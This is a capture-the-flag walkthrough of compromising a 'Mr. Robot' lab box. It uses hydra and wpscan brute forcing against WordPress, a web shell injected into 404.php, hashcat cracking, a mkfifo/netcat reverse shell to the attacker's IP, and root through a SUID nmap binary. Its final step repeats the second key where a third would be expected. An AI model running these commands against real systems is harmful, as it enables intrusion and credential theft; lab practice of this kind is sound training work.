# Mr. Robot

## Recon

`nmap -p 10.10.156.16` reveals:

```
Starting Nmap 7.80 ( https://nmap.org ) at 2020-04-30 04:22 UTC
Nmap scan report for ip-10-10-156-16.eu-west-1.compute.internal (10.10.156.16)
Host is up (0.00040s latency).
Not shown: 65532 filtered ports
PORT    STATE  SERVICE
22/tcp  closed ssh
80/tcp  open   http
443/tcp open   https
MAC Address: 02:07:5E:78:45:78 (Unknown)
```

Both website addresses loaded a sort of qausi-terminal in the browser, something that looks like it was maybe copied from a promotional site for the show.

Nikto on the http site revealed:

```
- Nikto v2.1.6
---------------------------------------------------------------------------
+ Target IP:          10.10.156.16
+ Target Hostname:    10.10.156.16
+ Target Port:        80
+ Start Time:         2020-04-30 04:30:32 (GMT0)
---------------------------------------------------------------------------
+ Server: Apache
+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
+ Retrieved x-powered-by header: PHP/5.5.29
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ Uncommon header 'tcn' found, with contents: list
+ Apache mod_negotiation is enabled with MultiViews, which allows attackers to easily brute force file names. See http://www.wisec.it/sectou.php?id=4698ebdc59d15. The following alternatives for 'index' were found: index.html, index.php
+ OSVDB-3092: /admin/: This might be interesting...
+ OSVDB-3092: /readme: This might be interesting...
+ Uncommon header 'link' found, with contents: <http://10.10.156.16/?p=23>; rel=shortlink
+ /wp-links-opml.php: This WordPress script reveals the installed version.
+ OSVDB-3092: /license.txt: License file found may identify site software.
+ /admin/index.html: Admin login page/section found.
+ Cookie wordpress_test_cookie created without the httponly flag
+ /wp-login/: Admin login page/section found.
+ /wordpress: A Wordpress installation was found.
+ /wp-admin/wp-login.php: Wordpress login found
+ /wordpresswp-admin/wp-login.php: Wordpress login found
+ /blog/wp-login.php: Wordpress login found
+ /wp-login.php: Wordpress login found
+ /wordpresswp-login.php: Wordpress login found
+ 7889 requests: 0 error(s) and 19 item(s) reported on remote host
+ End Time:           2020-04-30 04:35:33 (GMT0) (301 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested
```

`robots.txt` contained:

```
User-agent: *
fsocity.dic
key-1-of-3.txt
```

Giving me an easy first key of `073403c8a58a1f80d943455fb30724b9`

`fsocity.dic` (note the mispelled society) seemed to be a show-focused wordlist. Hmm...

## brute forcing a login

The wordpress login at `/wp-login.php` allowed trivial user enumeration: it would tell you whether the username existed. The first username I tried was successful: `elliot`, after the main character of Mr. Robot. Next step, to me, was brute forcing.

I tried hydra on the wp-login with the `fsocity.dic` file, as that seemed an obvious set of passwords. However after half an hour it still had nothing. I probably could leave it running, but it felt too slow. 

One optimisation was fixing up the source file. I didn't pick this up at first glance, but the fsocity.dic file had a lot of duplicates. Of its 800k entries, only about 11k were unique. Doing a `cat fsocity.dic | sort -u > fsocity.dic.sorted` fixed that up. Hydra was still slow though.

The command I was using, for the record, was: 

`hydra -l Elliot -P fsocity.dic.sorted 10.10.156.16 http-post-form "/wp-login/:log=^USER^&pwd=^PASS^&wp-submit=Log+In&redirect_to=http%3A%2F%2F10.10.156.16%2Fw
p-admin%2F&testcookie=1:S=302"`

I had run a `wpscan` against the wordpress site, but it hadn't returned anything of interest. However, wpscan also includes the ability to do bruteforcing, and even better directly against the xmlrpc rest service that wordpress uses. I ran the following command:

`wpscan --url http://10.10.156.16 -U elliot -P ./fsocity.dic.sorted`

And had a password, `ER28-0652`, in just under two minutes! Note to self, when attacking wp sites, use wpscan for bruteforcing! I had disdained it initially as I'd assumed hydra would be faster.

## getting a web shell and aiming for a real shell

With the password I could log into the wordpress admin site. First objective was to get some sort of web shell, or basically to get the ability to execute commands as the web site user. I'm sure there are plenty of ways of doing this, but for me after poking about the interface, I found the ability to edit plugin / template pages. I used this to inject a shell into 404.php.

After that I could browse to a nonsense url, like `/hello`, and get the 404 page with my prompt in it. With the shell I was able to see I was running as `daemon`, but with seemingly no rights to the local web folder other than to read it.

The home directory contained a folder for user `robot`, in which was two files: the second key and a password md5 file:

```
total 8
-r-------- 1 robot robot 33 Nov 13  2015 key-2-of-3.txt
-rw-r--r-- 1 robot robot 39 Nov 13  2015 password.raw-md5
```

The key wasn't readable unless I was `robot`, and I wasn't going to get that through this primitive shell. The machine also didn't have ssh available, so even if I got the password I wouldn't be able to login that way. I needed a reverse shell.

### getting robot's password for later

In any event, I could read the `password.raw-md5` file above: `robot:c3fcd3d76192e4007dfb496cca67e13b`. I switched to my windows machine (with its Nvidia 2080), ran `.\hashcat64.exe c3fcd3d76192e4007dfb496cca67e13b ..\rockyou.txt`, and swiftly had the password `abcdefghijklmnopqrstuvwxyz`

## reverse shell and victory

I started a netcat listener on my attacker machine, then tried a few different reverse shell strings. To my double surprise, first the standard python reverse shell I use didn't work, and secondly the following netcat.openbsd (the version without `-e`) reverse string DID work: `rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.102.174 4444 >/tmp/f`

So I had a shell as daemon. After using `python -c 'import pty; pty.spawn("/bin/bash")'` to get a better shell, I used `su robot` and the password I cracked to get a better user. `cat /home/robot/key2-of-3.txt` revealed `822c73956184f694993bede3eb39f959`.

`sudo -l` didn't work, so I checked for suid via `find / -perm -u=s 2>/dev/null`. It revealed `/usr/local/bin/nmap` as something that stood out. A quick look at gtfobins gave me a command to run, but it didn't work; wrong version of nmap.

However, in failing, nmap told me it supported `--interactive`, so I tried that. It gave me a sort of 'nmap shell'. And like many such interfaces, it included a way to run shell commands :) Specifically, `! whoami` returned root. 

Victory with the final command `! cat /home/robot/key-2-of-3.txt`, which returned `822c73956184f694993bede3eb39f959`.